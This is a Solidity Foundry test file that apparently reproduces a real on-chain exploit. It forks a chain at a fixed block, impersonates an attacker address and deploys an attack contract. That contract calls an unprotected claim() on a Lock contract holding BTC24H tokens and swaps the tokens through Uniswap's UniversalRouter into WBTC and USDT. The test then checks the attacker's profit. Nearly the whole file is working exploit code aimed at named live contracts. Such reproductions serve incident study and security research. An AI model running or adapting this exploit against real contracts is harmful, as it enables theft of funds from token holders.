
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 65560668;
    uint256 constant TX_TIMESTAMP = 1734370278;
    uint256 constant TX_BLOCK_NUMBER = 65560669;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBTC, "WBTC", 76433345);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT_8E8F, "USDT", 4953025389);
    }
}

contract OurAttack {
    uint24 internal constant UNI_V3_FEE_1PCT = 10_000;
    uint256 internal constant FIRST_BTC24H_IN = 10_000 ether;
    uint256 internal constant SECOND_BTC24H_IN = 100_000 ether;
    bytes internal constant V3_SWAP_EXACT_IN = hex"00";

    function attack() external payable {
        _claimAndSwap();
    }

    function _claimAndSwap() internal {
        _readLockBtc24h();
        _claimLock();
        _sendBtc24h(FIRST_BTC24H_IN);
        _swapBtc24hTo(Addresses.USDT_8E8F, FIRST_BTC24H_IN);
        _sendBtc24h(SECOND_BTC24H_IN);
        _swapBtc24hTo(Addresses.WBTC, SECOND_BTC24H_IN);
        _storageGap();
    }

    function _readLockBtc24h() internal view {
        IERC20Like(Addresses.BTC24H).balanceOf(Addresses.Lock);
    }

    function _claimLock() internal {
        ILock(Addresses.Lock).claim();
    }

    function _sendBtc24h(uint256 amountIn) internal {
        IERC20Like(Addresses.BTC24H).transfer(Addresses.UniversalRouter, amountIn);
    }

    function _swapBtc24hTo(address tokenOut, uint256 amountIn) internal {
        bytes[] memory swapInputs = new bytes[](1);
        swapInputs[0] = abi.encode(
            Addresses.attacker_eoa,
            amountIn,
            uint256(0),
            abi.encodePacked(Addresses.BTC24H, UNI_V3_FEE_1PCT, tokenOut),
            false
        );
        IUniversalRouter(Addresses.UniversalRouter).execute(V3_SWAP_EXACT_IN, swapInputs);
    }

    function _storageGap() internal pure {

    }

    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x00000000) {
            _claimAndSwap();
            return;
        }
        revert("unsupported callback");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant WBTC = 0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6;
    address internal constant attack_contract = 0x3CB2452c615007B9eF94D5814765eB48b71Ae520;
    address internal constant UniswapV3Pool = 0x495e8f82F3941C1Fd661151E5c794745e1e31027;
    address internal constant USDT = 0x7FFB3d637014488b63fb9858E279385685AFc1e2;
    address internal constant Lock = 0x968e1c984A431F3D0299563F15d48C395f70F719;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDT_8E8F = 0xc2132D05D31c914a87C6611C10748AEb04B58e8F;
    address internal constant UniswapV3Pool_A02A = 0xd06cD277CD01A630dcB8C7D678529d8a4111A02A;
    address internal constant attacker_eoa = 0xDE0A99Fb39E78eFd3529e31D78434f7645601163;
    address internal constant BTC24H = 0xea4b5C48a664501691B2ECB407938ee92D389a6f;
    address internal constant UniversalRouter = 0xec7BE89e9d109e7e3Fec59c222CF297125FEFda2;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ILock {
    function claim() external;
}

interface IUniversalRouter {
    function execute(bytes calldata, bytes[] calldata) external;
}
